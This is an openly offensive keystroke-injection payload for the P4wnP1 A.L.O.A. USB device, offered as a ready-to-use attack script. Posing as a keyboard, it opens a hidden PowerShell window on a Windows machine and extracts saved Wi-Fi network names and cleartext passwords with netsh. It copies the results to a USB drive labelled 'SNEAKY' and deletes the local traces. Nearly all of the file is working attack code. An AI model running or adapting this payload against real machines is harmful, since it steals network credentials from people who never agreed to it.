// Windows File Exfiltrator
// Author: PingDucKY https://github.com/PingDucKY/payloads-P4wnP1-A.L.O.A
// Edited by: Coderdude112 on GitHub 
// This attack extracts info on saved wifi networks and their passwords

layout('us');				// Set keyboard layout to US
var Ready = "False"			// Sets Ready to false beacuse we are not ready to begin the attack

function Attack() { 		// Initalizes the function Attack that acually exfiltrates the files
  delay(2200);				// Delay to make sure that File Explorer doesent take focus
  press("GUI r");			// Opens a run command
  delay(500);
  type("powershell\n");		// Opens powershell
  delay(500);
  
  type("powershell -windowstyle hidden {"); 													// Makes the window hidden for the duration of the attack
  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name;");	// Find the drive named "SNEAKY" and save it's path
  
  type("netsh wlan show profiles * > wirelessinfo.txt;");										// Gets the WIFI info and stores it in a txt file
  type("copy wirelessinfo.txt $usbpath.name;");													// Copyies wirelesspassword to the USB
  type("del wirelessinfo.txt;");																// Delets the copy of wirelessinfo on the host
  
  type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > wifikeys.txt;'); // Gets the keys to the wifi networks
  type("copy wifikeys.txt $usbpath.name;");														// Copies wifikeys to the USB
  type("del wifikeys.txt;");																	// Deletes the copy of wifikeys stored on the host
  
  type("}\n");  																				// Adds the close curly bracket making the attack hidden and starts the attack
}

function Initalized() { 	// Initalizes the function that checks if the device has been initalized by the host before running the attack
  while (Ready = "False") {
    press("SCROLL");
    result = waitLED(SCROLL,10);
    
    if (result.SCROLL) { 	// If this is true then the device is initalized. The loop will break and the attack will start
      Ready = "True";
      break;   
    } else {				// The device is not initalized so we will press scroll lock and retry
        press("SCROLL");
      }
    
  }
}

Initalized(); 				// Check if the host has initalized us
Attack();					// Run the attack
